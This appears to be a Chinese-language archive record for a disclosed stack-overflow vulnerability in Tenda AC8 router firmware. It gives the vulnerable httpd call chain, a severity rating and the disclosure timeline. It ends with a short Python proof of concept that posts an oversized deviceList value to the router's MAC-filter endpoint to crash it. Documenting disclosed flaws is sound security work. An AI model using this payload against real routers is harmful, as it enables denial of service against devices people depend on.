# CNVD-2024-38754 归档记录（已收录）

## 漏洞概要

- **产品**：深圳市吉祥腾达科技有限公司 AC8 路由器，固件 V16.03.33.05（US_AC8V4.0si_V16.03.33.05_multi_TDE01）
- **类型**：通用型漏洞 / 二进制漏洞（栈溢出，CWE-120）
- **位置**：`httpd` 中 `formsetmacfiltercfg` → `sub_47BCC4` → `sub_47C178` → `sub_47C418` → `sub_47DA08`（strcpy 未做长度检查）
- **影响**：远程拒绝服务（路由器宕机）
- **危害级别**：中危（AV:N/AC:H/Au:S/C:N/I:N/A:C）

## 编号与时间线

- **CNVD-ID**：CNVD-2024-38754
- **原创漏洞证明**：CNVD-YCGN-202408021643（通用—网络设备-中危）
- **报送时间**：2024-08-17；**收录时间**：2024-09-20；**通报日期**：2024-09-06
- **CNVD 报告页**：https://www.cnvd.org.cn/user/myreport/19867716

## 目录说明

- `formsetmacfilter/关于Tenda AC8存在二进制漏洞的情况通报.docx` — CNVD 通报原文（含完整分析与 PoC）
- `formsetmacfilter/httpd` — 漏洞二进制（MIPS-32 ELF）
- `formsetmacfilter/*.bin` / `*.7z` — 固件与解包文件系统
- `formsetmacfilter/*.mp4` — 宕机演示视频（qemu-mipsel-static 仿真环境）

## PoC

```python
import requests
url = "http://192.168.10.1/goform/setMacFilterCfg"
cookie = {"Cookie": "password=12345"}
data = {"macFilterType": "white", "deviceList": "\r" + "A" * 500}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
